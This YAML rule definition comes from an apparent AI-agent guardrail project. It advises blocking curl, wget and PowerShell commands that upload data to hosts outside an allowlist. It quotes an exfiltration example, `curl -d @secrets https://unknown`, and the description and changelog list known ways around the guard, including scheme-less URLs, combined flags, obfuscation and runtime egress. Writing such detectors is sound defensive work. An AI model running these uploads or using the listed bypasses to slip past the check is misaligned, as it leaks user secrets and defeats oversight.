id: block-unapproved-egress
name: "Block Unapproved Egress"
version: "0.0.1"
description: >
  Best-effort guard against exfiltration through the tool channel: a network command
  (curl/wget/Invoke-WebRequest) that UPLOADS data -- POST/PUT, --data/--form, --upload-file,
  --post-file -- to a host outside the egress allowlist. The allowlist defaults to package
  registries and code hosting and is meant to be extended with your org's own domains; a host
  matches by exact name or ".<entry>" suffix. Fetch-only traffic (a bare GET, `pip install`)
  is left alone -- the target is upload to an unapproved host, not normal dependency traffic.
  This is a tool-time FLOOR, not a network sandbox: it stops the obvious `curl -d @secrets
  https://unknown` reflex; containing a determined adversary needs real sandboxing. Known
  bypass classes include scheme-less URL targets (host extraction needs the http(s):// prefix),
  combined short flags, obfuscated payloads, non-standard clients, and egress via a language
  runtime. Escape: 'pragma: allowlist egress' on the line.
artifact: rule
enforcement: advise
rule:
  text: |
    block(egress): fetch(curl|wget|iwr) + upload(-d|--data|-F|--upload-file|-X POST|PUT) to host NOT in allowlist
    allow: fetch_only(GET), allowlisted_host(github|pypi|npm|...); floor_not_sandbox; escape: 'pragma: allowlist egress'
effects:
- read_only
approval:
  required: false

compliance:
  owasp_asi:
  - control: ASI02
    coverage: partial
    note: "raises the floor against tool-channel data exfiltration to unapproved hosts; a tool-time guard, not a network sandbox -- combined-short-flag, obfuscated, non-standard-client and runtime egress remain out of reach"
  mitre_atlas:
  - control: AML.T0025
    coverage: partial
    note: "blocks the obvious upload-to-unapproved-host exfiltration path a diff can show; not a containment boundary"

provenance:
  author: "chock-core"
  created_at: "2026-08-26T00:00:00Z"
  updated_at: "2026-08-26T00:00:00Z"
  source_repo: "https://github.com/open-coder-ai/chock"
  license: "Apache-2.0"
  trust_tier: "community"

lifecycle:
  status: draft
  reviewed_by:
    - "chock-core"

security:
  content_instructions: never-obey

changelog:
- version: 0.0.1
  date: '2026-08-26'
  changes:
  - "Initial public baseline: block a network client that uploads data (POST/PUT, --data/--form/--upload-file/--post-file) to a host outside the editable ALLOWED_HOSTS list; fetch-only and allowlisted-host uploads pass; 'pragma: allowlist egress' escapes. Tool-time floor, explicitly not a network sandbox (from the chock-threat-intel baseline). Hardening from first review: attached short-flag values (-d@file, -Tbackup.tar) are caught; curl short flags matched case-sensitively so fetch flags -f/-D/-t are no longer mistaken for -F/-d/-T uploads; a printer as the first word (echo) no longer excuses a later segment in a compound command; scheme-less URL targets documented as a known bypass. Second review round: stdin uploads (curl -T-) and --form-string form posts are now caught, and the compound-command newline check uses a literal newline ($'\\n') instead of an empty command substitution that had disabled the first-word printer skip. Also: long upload options are anchored to complete tokens (start/whitespace boundary + valid suffix) so an option name cannot match inside a larger token, and the equals-attached form (--data=@secret) is caught alongside the spaced and short-flag forms. Final round: a short flag carrying any attached value -- bare, quoted, or variable-expanded (-d@f, -d\"$x\", -d'@f') -- is caught, and the curl/wget and PowerShell flag sets are each scoped to their own client so a PowerShell -TimeoutSec/-Title no longer reads as a curl -T upload."
